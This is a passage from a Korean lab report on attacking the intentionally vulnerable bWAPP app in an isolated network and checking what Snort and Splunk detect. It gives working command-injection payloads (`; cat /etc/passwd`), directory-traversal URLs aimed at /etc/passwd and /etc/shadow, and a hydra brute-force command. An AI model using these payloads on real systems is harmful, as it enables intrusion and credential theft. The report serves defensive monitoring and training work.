→ **단 한 줄의 명령 주입**이 서버 완전 장악 → 내부망 침투까지 이어질 수 있어, 위험도는 **Critical**이다.
이것이 Phase 2에서 **DMZ 아웃바운드 차단**(리버스쉘 방지)을 방화벽 정책에 포함하는 이유다.

> **CWE-78: Improper Neutralization of Special Elements used in an OS Command**
> OWASP 2021 A03 Injection. SQL Injection(CWE-89)과 함께 Injection 카테고리의 대표 취약점이다.

**사전 준비:**
- ✅ Bee-box DNS 설정 완료 (`echo "nameserver 10.0.10.1" | sudo tee /etc/resolv.conf`)
- nslookup이 빠르게 응답하도록 해둬야 명령 주입 결과를 바로 볼 수 있음

**실습 절차:**

1. att-mint 브라우저에서 bWAPP > `OS Command Injection` 선택 > Hack
2. DNS lookup 입력란에 아래를 **하나씩** 입력 후 Lookup 클릭:

```bash
# Step 1: 기본 동작 확인 (정상 요청)
127.0.0.1

# Step 2: 세미콜론으로 명령 주입 — 서버 사용자 확인
127.0.0.1; whoami
# 예상 결과: nslookup 결과 + "www-data" 출력

# Step 3: 시스템 정보 수집
127.0.0.1; uname -a
# 예상 결과: Linux bee-box 2.6.x ... (커널 버전)

# Step 4: 민감 파일 읽기 — /etc/passwd
127.0.0.1; cat /etc/passwd
# 예상 결과: root:x:0:0:... bee:x:1000:... 등 계정 목록 전체 노출

# Step 5: 네트워크 정보 수집
127.0.0.1; ifconfig
# 예상 결과: 서버 IP(10.0.10.50) 등 내부 네트워크 정보
```

3. 만약 `;`이 안 먹히면 다른 구분자 시도: `127.0.0.1 | whoami` 또는 `127.0.0.1 && whoami`

**결과:** ✅ (2026-08-10 17:23 KST)

**공격 페이로드 & 결과:**
- `127.0.0.1; whoami` → nslookup 결과 + **`www-data`** 출력 = 웹서버 권한으로 OS 명령 실행 성공
- `127.0.0.1; cat /etc/passwd` → 시스템 계정 목록 **전체 노출**:
  ```
  root:x:0:0:root:/root:/bin/bash
  www-data:x:33:33:www-data:/var/www:/bin/sh
  bee:x:1000:1000:bee,,,:/home/bee:/bin/bash
  mysql:x:104:113:MySQL Server,,,:/var/lib/mysql:/bin/false
  neo:x:1001:1001:,,,:/home/neo:/bin/bash
  alice:x:1002:1002:,,,:/home/alice:/bin/bash
  thor:x:1003:1003:,,,:/home/thor:/bin/bash
  wolverine:x:1004:1004:,,,:/home/wolverine:/bin/bash
  ...
  ```
  → www-data 권한으로 시스템 전체 계정 정보 접근 가능 확인

**Snort 탐지: ⚠️ 응답측만 탐지 (1건, 중요 발견)**

Splunk `index=pfsense 10.50.50.17` 검색 결과:
```
ET ATTACK_RESPONSE Possible /etc/passwd via HTTP (linux style)
[Classification: Potentially Bad Traffic] [Priority: 2]
[TCP] 10.0.0.254:80 -> 10.50.50.17:41158
```
- **요청(Request) 방향** — 탐지 **❌**: 공격 페이로드(`; cat /etc/passwd`)는 **POST body**로 전송됨. Snort URI 검사 룰은 POST body를 검사하지 않으므로 요청 시점 탐지 실패
- **응답(Response) 방향** — 탐지 **✅**: 서버 응답 body에 `/etc/passwd` 내용이 포함되어 `ET ATTACK_RESPONSE` 룰이 탐지 (방향: 서버 → 공격자)
- **E-3/E-4/E-5 탐지 패턴 비교 — 네트워크 IPS 한계 종합:**

| 공격 | 요청 경로 | 요청 탐지 | 응답 탐지 | 총 탐지 |
|------|----------|----------|----------|--------|
| E-3 Reflected XSS | GET (URI) | ✅ `Script tag in URI` | — | 3건 |
| E-4 Stored XSS | POST body | ❌ | ❌ | **0건** |
| E-5 Command Injection | POST body | ❌ | ✅ `ATTACK_RESPONSE passwd` | **1건** |

→ Snort는 **URI(GET 파라미터)만 잘 검사**하고, **POST body는 검사하지 못한다**. 다만 응답에 `/etc/passwd` 같은 **민감 정보 패턴**이 있으면 응답측 룰로 탐지 가능. E-4는 응답에도 탐지 가능한 패턴이 없어 완전히 놓침.

**관제/컨설팅 관점:**
- 위험도: **Critical** — 서버 OS 명령 실행 = 시스템 완전 장악 가능 (리버스쉘, 파일 조작, 권한상승)
- 방어: 입력값에서 셸 메타문자 제거, `escapeshellarg()` 사용, OS 명령 대신 언어 내장 함수(PHP `gethostbyname()`) 사용
- 관제 포인트: `ATTACK_RESPONSE` 시그니처는 **공격 성공 후** 탐지이므로, 이미 데이터가 유출된 상태. **사후 탐지**의 한계 → 사전 방어(입력 검증, WAF)가 필수

**스크린샷:**

![E-5 whoami 명령 주입 성공](images/E-5-cmdi-whoami.png)
![E-5 /etc/passwd 유출](images/E-5-cmdi-passwd.png)
![E-5 Snort ATTACK_RESPONSE 탐지 (Splunk)](images/E-5-snort-splunk.png)

---

### E-6. Directory Traversal

#### 개념 상세 — Directory Traversal(경로 조작)이란

**Directory Traversal**(Path Traversal이라고도 함)은 웹 애플리케이션이 파일 경로를 사용자 입력으로 받을 때, `../`(상위 디렉토리 이동)를 반복 삽입하여 **웹루트(DocumentRoot) 밖의 시스템 파일에 접근**하는 취약점이다.

**취약한 코드의 원리:**

```php
// ❌ 취약한 코드 (bWAPP directory_traversal_1.php의 구조)
$file = $_GET['page'];
include("languages/" . $file);

// 정상 요청: ?page=en.php
//   포함: languages/en.php  ← 웹루트 내 정상 파일

// 공격 요청: ?page=../../../etc/passwd
//   포함: languages/../../../etc/passwd
//   → 경로 해석: /etc/passwd  ← 웹루트 밖의 시스템 파일 접근!

// ✅ 안전한 코드
$file = basename($_GET['page']);  // 경로 구분자 제거, 파일명만 추출
$allowed = ['en.php', 'ko.php', 'de.php'];  // 화이트리스트
if (in_array($file, $allowed)) { include("languages/" . $file); }
```

**`../`의 동작 원리 — 파일 시스템 경로 해석:**

```
웹루트: /var/www/bWAPP/languages/
         ↓ ../     → /var/www/bWAPP/
         ↓ ../../  → /var/www/
         ↓ ../../../ → /var/
         ↓ ../../../../ → /
         ↓ ../../../../etc/passwd → /etc/passwd (시스템 계정 파일)
```

**유출 가능한 민감 파일들:**

| 파일 | 내용 | 위험도 |
|------|------|--------|
| `/etc/passwd` | 시스템 계정 목록 (사용자명, UID, 홈 디렉토리, 셸) | High |
| `/etc/shadow` | 비밀번호 해시 (www-data 권한으로는 보통 접근 불가) | Critical |
| `/var/www/bWAPP/config/db.php` | DB 접속 정보 (호스트, 사용자, 비밀번호) | Critical |
| `/etc/apache2/apache2.conf` | 웹서버 설정 (가상호스트, 모듈, 경로) | Medium |
| `~/.bash_history` | 명령어 이력 (관리자 작업 내역 노출) | High |

**Directory Traversal vs 관련 공격:**

| 공격 | 핵심 | 차이점 |
|------|------|--------|
| Directory Traversal (E-6) | `../` 경로 조작으로 **파일 읽기** | 파일 읽기만 가능 |
| LFI (Local File Inclusion) | 경로 조작 + **파일을 코드로 실행** | PHP include 시 코드 실행까지 |
| RFI (Remote File Inclusion) | 원격 URL의 파일을 **서버에서 실행** | 외부 악성 코드 로딩 |
| E-5 Command Injection | OS 명령 실행으로 **파일 읽기 + α** | 명령 실행 = 더 넓은 범위 |

> R-3(nikto)에서 이미 traversal 흔적이 Snort에 탐지되었다. 여기서는 **수동으로 실제 파일 열람 성공 여부**를 확인한다.
> **CWE-22: Improper Limitation of a Pathname to a Restricted Directory**
> OWASP 2021 A01 Broken Access Control — 2021년 OWASP Top 10에서 **1위**로 올라선 카테고리.

**bWAPP 메뉴:** Directory Traversal - Files (`directory_traversal_1.php`)

**실습 절차:**

1. att-mint 브라우저에서 bWAPP > `Directory Traversal - Files` 선택 > Hack
2. 페이지에 파일 선택 드롭다운 또는 URL 파라미터가 보임
3. **URL 파라미터를 직접 수정**하여 시도:

```
# Step 1: 정상 동작 확인
페이지의 기본 파일(message.txt 등)을 선택하여 정상 출력 확인

# Step 2: /etc/passwd 열람 시도
URL의 page 파라미터를 아래로 변경:
http://10.0.0.254/bWAPP/directory_traversal_1.php?page=../../../etc/passwd

# Step 3: 깊이 조절 (안 되면 ../ 추가)
?page=../../../../etc/passwd
?page=../../../../../etc/passwd

# Step 4: /etc/shadow 시도 (권한 필요 — 실패할 수도 있음)
?page=../../../etc/shadow
```

**확인 포인트:**
- [ ] `/etc/passwd` 내용이 브라우저에 표시됨 = Directory Traversal 성공
- [ ] `/etc/shadow` 는 권한 문제로 실패할 가능성 높음 (www-data 권한) — 실패해도 정상
- [ ] 캡처: passwd 열람 결과 → `images/E-6-traversal.png`

**Snort 탐지 확인:**
- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
- 예상 시그니처:
  ```
  ET WEB_SERVER /etc/passwd Detected in URI
  (http_inspect) WEBROOT DIRECTORY TRAVERSAL
  ```
- R-3(nikto)에서 이미 같은 룰이 탐지된 바 있음 — 수동 시도에서도 동일하게 탐지될 것
- 캡처: Splunk 결과 → `images/E-6-snort-splunk.png`

**관제/컨설팅 관점:**
- 위험도: **High** — 시스템 설정파일·소스코드·비밀키 유출 가능
- 방어: 파일 경로 입력 시 `../` 필터링, `realpath()` + 화이트리스트 기반 경로 검증, `open_basedir` 설정
- 관제 포인트: URI에 `../`, `/etc/passwd`, `/etc/shadow` 등이 포함되면 즉시 경보 → IPS 룰이 잘 탐지하는 영역

---

### E-7. Brute Force (hydra)

#### 개념 상세 — Brute Force(무차별 대입) 공격이란

**Brute Force**는 로그인 폼에 다수의 자격증명(ID/PW 조합)을 **자동으로 대입**하여 유효한 계정을 찾는 공격이다. 기술적 취약점이 아닌 **약한 비밀번호·인증 정책의 부재**를 노리는 공격으로, 가장 단순하지만 여전히 효과적이다.

**인증 공격의 분류:**

| 공격 유형 | 방법 | 특징 | 소요 시간 |
|----------|------|------|-----------|
| **Brute Force (전수 조사)** | 모든 가능한 조합 시도 (aaa, aab, aac...) | 확실하지만 매우 느림 | 수일~수년 |
| **Dictionary Attack (사전 공격)** | 자주 쓰이는 비밀번호 목록 대입 | 현실적 속도, 약한 PW에 효과적 | 수분~수시간 |
| **Credential Stuffing** | 유출된 ID/PW 목록을 다른 사이트에 대입 | 비밀번호 재사용 노림 | 수분 |
| **Password Spraying** | 소수 PW를 다수 계정에 대입 | 계정 잠금 우회 | 수시간~수일 |

> 이번 실습은 **Dictionary Attack** — 자주 쓰이는 비밀번호 사전(wordlist)을 bWAPP 로그인에 대입한다.

**이번 실습에서의 의미 — 왜 E-2 이후에도 하는가:**
- E-2(sqlmap)에서 이미 DB 해시를 크랙하여 비밀번호(`bug`)를 알아냈지만,
- Brute Force는 **DB 접근 없이도 계정을 탈취**할 수 있고,
- 관제 관점에서 **반복 로그인 시도 탐지**와 **계정 잠금 정책 부재** 확인이 핵심 시나리오다.

**Brute Force 방어의 핵심 계층:**

```
1차: 강한 비밀번호 정책 (길이 8+, 복잡성, 사전 단어 금지)
         ↓ 뚫리면
2차: 계정 잠금 (N회 실패 시 일정 시간 잠금)
         ↓ 뚫리면
3차: CAPTCHA / MFA (자동화 도구 차단)
         ↓ 뚫리면
4차: IP 기반 차단 (fail2ban, Snort Block Offenders)
         ↓ 뚫리면
5차: 관제 탐지 → 수동 대응 (Splunk 알림 → SOC 분석)
```

→ bWAPP(Security Level: low)은 위 방어가 **전부 없는** 상태이므로, 10개 사전으로도 수초 내 크랙 가능.

> **CWE-307: Improper Restriction of Excessive Authentication Attempts**
> OWASP 2021 A07 Identification and Authentication Failures — 인증 시스템의 취약점. 비밀번호 정책, 다중 인증, 시도 제한이 없으면 자동화 공격에 무방비 상태가 된다.

**bWAPP 메뉴:** 직접 사용하지 않음 — bWAPP 로그인 페이지(`login.php`)를 대상으로 hydra 실행

**실습 절차:**

1. att-mint 터미널에서 실행:

```bash
# Step 1: 워드리스트 생성
cat > wordlist.txt << 'EOF'
admin
password
123456
bee
bug
test
root
letmein
bwapp
1234
EOF
```

2. 로그인 실패 시 응답에 포함되는 **실패 문자열 확인** (hydra가 성공/실패를 구분하는 기준):

```bash
# 틀린 비밀번호로 로그인 시도하여 실패 메시지 확인
curl -s -d "login=bee&password=wrong&security_level=0&form=submit" \
  http://10.0.0.254/bWAPP/login.php | grep -i "invalid\|error\|wrong"
# "Invalid credentials" 같은 문자열이 나오면 그걸 hydra -F 조건에 사용
```

3. hydra 브루트포스 실행:

```bash
# Step 2: hydra 실행 (HTTP POST form)
hydra -l bee -P wordlist.txt 10.0.0.254 \
  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid" \
  -V -t 4

# 옵션 설명:
#   -l bee         : 사용자명 고정 (bee)
#   -P wordlist.txt: 비밀번호 사전
#   http-post-form : HTTP POST 방식 로그인
#   :Invalid       : 이 문자열이 응답에 있으면 실패로 판단
#   -V             : 각 시도를 출력 (verbose)
#   -t 4           : 동시 4스레드
```

4. 예상 결과: `[80][http-post-form] host: 10.0.0.254   login: bee   password: bug`

**⚠️ 실패 문자열 주의:**
- `Invalid`가 안 맞으면 hydra가 모든 비밀번호를 "성공"으로 판단함
- Step 2에서 실제 실패 응답을 확인한 후 정확한 문자열을 사용할 것
- bWAPP 버전에 따라 `Invalid credentials`, `invalid`, `not correct` 등 다를 수 있음

**확인 포인트:**
- [ ] hydra가 `bee`/`bug` 조합을 찾아냄 = 브루트포스 성공
- [ ] E-2에서 크랙한 비밀번호(bug)와 일치 확인
- [ ] 캡처: hydra 실행 결과 → `images/E-7-hydra.png`

**Snort 탐지 확인:**
- Splunk: `index=pfsense 10.50.50.17` (Last 15 minutes)
- 예상 시그니처:
  ```
  ET SCAN Hydra User-Agent Detected          ← hydra 도구 식별
  ET WEB_SERVER Brute Force Login Attempt     ← 반복 로그인 시도
  ```
- sqlmap(E-2)처럼 자동화 도구는 User-Agent로 식별되므로 탐지 가능성 높음
- 단, 적은 횟수(10회)로는 rate-based 룰에 안 걸릴 수 있음
- 캡처: Splunk 결과 → `images/E-7-snort-splunk.png`

**관제/컨설팅 관점:**
- 위험도: **High** — 약한 비밀번호 사용 시 계정 탈취
- 방어: 계정 잠금(N회 실패 시 잠금), CAPTCHA, 로그인 rate-limit, 강한 비밀번호 정책
- 관제 포인트: 동일 IP에서 짧은 시간에 다수 로그인 시도 = 브루트포스 징후 → 자동 차단 트리거

---

## 공격 타임라인 (계획)

| 시각 | 공격 | 비고 |
|------|------|------|
| 00:00-00:15 | R-1~R-4 정찰 | 스캔성 트래픽 |
| 00:20-00:40 | E-1~E-2 SQL Injection | DB 공격 |
| 00:45-01:00 | E-3~E-4 XSS | 클라이언트 공격 |
| 01:05-01:15 | E-5 Command Injection | 서버 장악 시도 |
| 01:20-01:30 | E-6~E-7 Traversal + Brute Force | 정보수집 + 인증공격 |

> 각 공격을 15~20분 간격으로 수행하여 Splunk 타임라인에서 공격 유형별로 명확히 구분

---

## 실제 수행 시각 기록표

> Splunk 타임차트(`timechart count by signature`)와 1:1 대조하기 위해, 각 공격을 실행한 **실제 시각(KST)** 을 실습 중에 즉시 기록한다.
> 시각 기준을 att-mint · pfSense · Splunk 서버가 동일하게 맞추도록 실습 전 NTP/시간 동기화를 먼저 확인한다.

⚠️ **타임존 주의사항 (스크린샷에서 확인):**
- pfSense syslog 원본 타임스탬프는 **UTC**로 전송됨 (예: R-1 실행 시 syslog에 `Aug 3 10:50` = KST 19:50)
- Splunk 계정 타임존을 **Asia/Seoul(GMT+9)**로 설정한 후에는 Splunk 표시 시각이 KST와 정확히 일치 (7:50 PM = 19:50)
- syslog 원본(UTC)과 Splunk 표시(KST)가 **9시간 차이**로 보이지만, 이는 정상 — 같은 시점을 다른 타임존으로 표현한 것
- **Phase 2 분석 시:** Splunk 검색은 KST 기준으로 시간 범위를 지정하면 됨 (타임존 설정 완료 상태)

| 단계 | 공격 | 실제 수행 시각 (KST) | 날짜 | 출발지 IP | 대상 | Splunk 확인 | Snort 탐지 |
|------|------|---------------------|------|-----------|------|-------------|-----------|
| R-1 | TCP 포트 스캔 | 19:50 | 2026-08-03 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ sfPortscan |
| R-2 | 서비스 버전 탐지 | 19:58 | 2026-08-03 | 10.50.50.17 | 10.0.0.254 | ☑ | △ (R-1과 묶임) |
| R-3 | 웹 취약점 스캔 (nikto) | 20:01 | 2026-08-03 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 868건 |
| R-4 | 디렉토리 브루트포스 (dirb) | 20:05 | 2026-08-03 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ GPL WEB_SERVER |
| E-1 | SQL Injection (수동) | 09:29 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 4건 |
| E-2 | SQL Injection (sqlmap) | 09:37 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 211건 |
| E-3 | Reflected XSS | 10:03 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 3건 |
| E-4 | Stored XSS | 10:08 | 2026-08-04 | 10.50.50.17 | 10.0.0.254 | ☑ | ✘ 미탐지 |
| E-5 | OS Command Injection | 17:23 | 2026-08-10 | 10.50.50.17 | 10.0.0.254 | ☑ | ☑ 1건 (응답측) |
| E-6 | Directory Traversal | | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-7 | Brute Force (hydra) | | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |

---

## 실습 정리 (Cleanup)

> 반복 실습 시 이전 흔적이 결과를 오염시키지 않도록, 한 사이클이 끝나면 아래를 정리한다.
> **주의:** 정리 작업 자체는 Splunk에 기록된 로그(index=pfsense)를 지우지 않는다 — 분석용 원본 로그는 보존한다.

- [ ] **Stored XSS 페이로드 삭제** — bWAPP Blog에 저장한 `<script>` 게시글 제거 (E-4)
- [ ] **att-mint 산출물 정리** — `scan_*.txt`, `nikto_result.txt`, `dirb_result.txt`, `wordlist.txt`, sqlmap 세션·덤프(`~/.local/share/sqlmap/` 또는 `~/.sqlmap/output/`) 백업 후 삭제
- [ ] **bWAPP 상태 초기화** — 필요 시 bWAPP `/reset` 또는 DB 재초기화로 변조 데이터 원복
- [ ] **방화벽/Snort 임시 규칙 원복** — Phase 2·3에서 넣은 차단 규칙·Snort 차단 목록(Blocked)을 다음 실습 전 초기 상태로 되돌림
- [ ] **시각 기록 저장** — 위 "실제 수행 시각 기록표"를 사이클별로 별도 보관 (덮어쓰기 방지)
